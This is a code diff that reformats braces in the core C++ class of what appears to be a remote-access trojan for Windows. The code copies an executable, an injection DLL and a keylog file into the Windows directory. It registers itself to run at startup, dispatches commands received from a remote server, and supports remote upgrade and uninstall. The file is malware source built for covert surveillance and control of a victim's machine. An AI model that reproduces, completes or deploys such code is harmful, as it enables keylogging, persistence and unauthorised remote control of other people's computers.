@@ -19,16 +19,14 @@ using namespace Keyboard;
 #include "RemoteControlFunctions.hpp"
 #include "SlaveCore.hpp"
 
-namespace Inhibition
-{
+namespace Inhibition {
 	SlaveCore::SlaveCore(Common::ConnectionInfo info) :
 		exited(false),
 		session(info, Network::Timeout(60)),
 		installPath(System::getWindowsPath() + "\\" + Common::INHIBITER_EXE_NAME),
 		keylogPath(System::getWindowsPath() + "\\" + Common::KEYLOG),
 		dllPath(System::getWindowsPath() + "\\" + Common::INHIBITION_DLL_NAME),
-		startup(installPath)
-	{
+		startup(installPath) {
 		setConnection(info);
 
 		// recuperation du chemin d'installation de l'injecteur
@@ -61,34 +59,28 @@ namespace Inhibition
 		dispatcher.addServerFunction(GET_CLIENT_NAME,       new SendClientName);
 	}
 
-	SlaveCore::~SlaveCore()
-	{
+	SlaveCore::~SlaveCore() {
 		exit();
 	}
 
-	Blaspheme::Session& SlaveCore::getSession()
-	{
+	Blaspheme::Session& SlaveCore::getSession() {
 		return session;
 	}
 
-	void SlaveCore::exit()
-	{
+	void SlaveCore::exit() {
 		LOG << "Slave exiting normally";
 		exited = true;
 	}
 
-	bool SlaveCore::exiting()
-	{
+	bool SlaveCore::exiting() {
 		return exited;
 	}
 
-	bool SlaveCore::connect()
-	{
+	bool SlaveCore::connect() {
 		return session.connect();
 	}
 
-	bool SlaveCore::acquire_stream()
-	{
+	bool SlaveCore::acquire_stream() {
 		/*
 		TcpClient aux;
 		if(aux.connect(cinfo.ip, cinfo.port))
@@ -108,50 +100,41 @@ namespace Inhibition
 		return false;
 	}
 
-	const Common::ConnectionInfo& SlaveCore::getConnection()const
-	{
+	const Common::ConnectionInfo& SlaveCore::getConnection()const {
 		return session.getConnection();
 	}
 
-	void SlaveCore::setConnection(const Common::ConnectionInfo& info)
-	{
+	void SlaveCore::setConnection(const Common::ConnectionInfo& info) {
 		session.setConnection(info);
 	}
 
-	const std::string& SlaveCore::getInstallPath()
-	{
+	const std::string& SlaveCore::getInstallPath() {
 		return installPath;
 	}
 
-	void SlaveCore::disconnect()
-	{
+	void SlaveCore::disconnect() {
 		LOG << "Disconnecting";
 		// on nettoie a la fois la connexion principale et les connexions auxiliaire
 		session.setId(0);
 		session.reset();
 	}
 
-	bool SlaveCore::process_command()
-	{
+	bool SlaveCore::process_command() {
 		TRACE_FUNCTION
 		std::string buffer_cmd;
 		LOG << "Waiting command";
 		session >> buffer_cmd;
-		if(dispatcher.find(buffer_cmd))
-		{
+		if(dispatcher.find(buffer_cmd)) {
 			LOG << "Command known : " + buffer_cmd;
 			dispatcher.dispatch(buffer_cmd);
-		}
-		else
-		{
+		} else {
 			LOG << "Command unknown : " + buffer_cmd;
 			return false;
 		}
 		return true;
 	}
 
-	bool SlaveCore::uninstall()
-	{
+	bool SlaveCore::uninstall() {
 		LOG << "Removing registry key";
 		startup.uninstall();
 		LOG << "Launching uninstaller";
@@ -160,11 +143,9 @@ namespace Inhibition
 		return true;
 	}
 
-	void SlaveCore::upgrade()
-	{
+	void SlaveCore::upgrade() {
 		LOG << "Upgrading executable";
-		if(!DeleteFile(getInstallPath().c_str()))
-		{
+		if(!DeleteFile(getInstallPath().c_str())) {
 			LOG << "DeleteFile failed : "+Common::toString(GetLastError());
 			session << FAILURE;
 			return;
